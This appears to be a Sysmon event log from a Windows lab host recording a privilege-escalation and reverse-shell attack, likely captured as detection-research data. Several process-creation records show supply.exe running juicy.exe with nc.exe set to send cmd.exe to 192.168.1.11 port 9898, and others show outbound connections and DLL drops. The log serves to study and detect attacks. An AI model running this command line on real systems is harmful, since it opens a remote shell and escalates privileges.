{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:41.931","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-332D-6095-5E06-000000001D00","ProcessId":6740,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI67402\\msvcr90.dll","UtcTime":"2021-05-07 12:31:41.931"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2828,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:41.941932Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:41.962","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-332D-6095-5E06-000000001D00","ProcessId":6740,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI67402\\python27.dll","UtcTime":"2021-05-07 12:31:41.962"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2829,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:41.973316Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-332D-6095-5E06-000000001D00","ParentProcessId":6740,"ProcessGuid":"747F3D96-332D-6095-6106-000000001D00","ProcessId":6416,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:31:41.977"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2830,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:41.980378Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":8080,"DestinationPortName":"-","Image":"C:\\Windows\\Temp\\supply.exe","Initiated":true,"ProcessGuid":"747F3D96-332C-6095-5A06-000000001D00","ProcessId":6700,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50968,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:31:41.376"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":2831,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:42.650331Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":8080,"DestinationPortName":"-","Image":"C:\\Windows\\Temp\\supply.exe","Initiated":true,"ProcessGuid":"747F3D96-332C-6095-5B06-000000001D00","ProcessId":8468,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50969,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:31:41.426"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":2832,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:42.650357Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-332D-6095-5F06-000000001D00","ParentProcessId":3272,"ProcessGuid":"747F3D96-332E-6095-6206-000000001D00","ProcessId":7252,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:31:42.740"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2833,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:42.787757Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-332D-6095-6006-000000001D00","ParentProcessId":8036,"ProcessGuid":"747F3D96-332E-6095-6306-000000001D00","ProcessId":6476,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:31:42.762"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2834,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:42.792190Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-332D-6095-6106-000000001D00","ParentProcessId":6416,"ProcessGuid":"747F3D96-332E-6095-6406-000000001D00","ProcessId":3232,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:31:42.790"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2835,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:42.792756Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:42.852","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-332E-6095-6306-000000001D00","ProcessId":6476,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI64762\\msvcm90.dll","UtcTime":"2021-05-07 12:31:42.852"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2836,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:42.860554Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:42.852","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-332E-6095-6406-000000001D00","ProcessId":3232,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI32322\\msvcm90.dll","UtcTime":"2021-05-07 12:31:42.852"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2837,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:42.861681Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:42.868","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-332E-6095-6306-000000001D00","ProcessId":6476,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI64762\\msvcp90.dll","UtcTime":"2021-05-07 12:31:42.868"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2838,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:42.871647Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:42.868","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-332E-6095-6306-000000001D00","ProcessId":6476,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI64762\\msvcr90.dll","UtcTime":"2021-05-07 12:31:42.868"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2839,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:42.877723Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:42.884","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-332E-6095-6206-000000001D00","ProcessId":7252,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI72522\\msvcm90.dll","UtcTime":"2021-05-07 12:31:42.884"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2840,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:42.908057Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:42.900","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-332E-6095-6206-000000001D00","ProcessId":7252,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI72522\\msvcp90.dll","UtcTime":"2021-05-07 12:31:42.900"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2841,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:42.908087Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:42.900","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-332E-6095-6406-000000001D00","ProcessId":3232,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI32322\\msvcp90.dll","UtcTime":"2021-05-07 12:31:42.900"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2842,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:42.909230Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:42.900","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-332E-6095-6406-000000001D00","ProcessId":3232,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI32322\\msvcr90.dll","UtcTime":"2021-05-07 12:31:42.900"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2843,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:42.915999Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":8080,"DestinationPortName":"-","Image":"C:\\Windows\\Temp\\supply.exe","Initiated":true,"ProcessGuid":"747F3D96-332C-6095-5906-000000001D00","ProcessId":6568,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50970,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:31:41.761"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":2844,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:42.916336Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:42.915","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-332E-6095-6206-000000001D00","ProcessId":7252,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI72522\\msvcr90.dll","UtcTime":"2021-05-07 12:31:42.915"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2845,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:42.916880Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:42.930","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-332E-6095-6206-000000001D00","ProcessId":7252,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI72522\\python27.dll","UtcTime":"2021-05-07 12:31:42.930"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2846,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:42.947960Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-332E-6095-6206-000000001D00","ParentProcessId":7252,"ProcessGuid":"747F3D96-332E-6095-6506-000000001D00","ProcessId":6340,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:31:42.960"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2847,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:42.964703Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:42.963","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-332E-6095-6306-000000001D00","ProcessId":6476,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI64762\\python27.dll","UtcTime":"2021-05-07 12:31:42.977"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2848,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:43.032693Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-332E-6095-6306-000000001D00","ParentProcessId":6476,"ProcessGuid":"747F3D96-332E-6095-6606-000000001D00","ProcessId":9384,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:31:42.990"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":2849,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:43.034989Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:31:42.993","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-332E-6095-6406-000000001D00","ProcessId":3232,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI32322\\python27.dll","UtcTime":"2021-05-07 12:31:42.993"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":2850,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:31:43.035047Z"}},"Version":2}}
